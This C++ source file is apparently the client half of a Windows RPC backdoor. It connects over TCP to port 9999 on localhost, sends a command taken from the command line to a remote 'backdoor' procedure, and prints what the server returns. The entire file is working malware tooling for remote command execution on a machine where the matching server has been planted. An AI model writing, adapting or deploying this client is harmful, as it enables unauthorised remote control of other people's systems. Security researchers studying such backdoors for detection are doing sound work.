#include <iostream>
#include <windows.h>
#include "rpc_backdoor_server.h"
#pragma comment(lib, "rpcrt4.lib")


int main(int argc, char **argv)
{
	RPC_STATUS status;
	RPC_WSTR szStringBinding = NULL;
	

	status = RpcStringBindingComposeW(
		NULL,                        // UUID of the interface
		(RPC_WSTR)L"ncacn_ip_tcp",   // TCP binding 
		(RPC_WSTR)L"127.0.0.1",			// Server IP address
		(RPC_WSTR)L"9999",			// Port on which the interface is listening
		NULL,						 // Network protocol to use
		&szStringBinding             // Variable in which the binding string is to be stored
	);

	std::cout << "BindingString: " << *szStringBinding << "\n";

	status = RpcBindingFromStringBindingW(
		szStringBinding,
		&ImplicitHandle
	);
	if (status) {
		// status is 0 if succeeds
		std::cout << "Something went wrong when binding, exiting ... \n";
		exit(EXIT_FAILURE);
	}

	RpcTryExcept{

		LPSTR cmd = argv[1];
		LPSTR output = 0;

		backdoor(&cmd, &output);
		std::cout << "[+] Received from the server: " << output << "\n";


	}
		RpcExcept(1) {
		printf("RPCExec: %d\n", RpcExceptionCode());
	}
	RpcEndExcept

		status = RpcStringFreeW(&szStringBinding);

	status = RpcBindingFree(&ImplicitHandle);
}

void* __RPC_USER midl_user_allocate(size_t size) {
	return malloc(size);
}

void __RPC_USER midl_user_free(void* p) {
	free(p);
}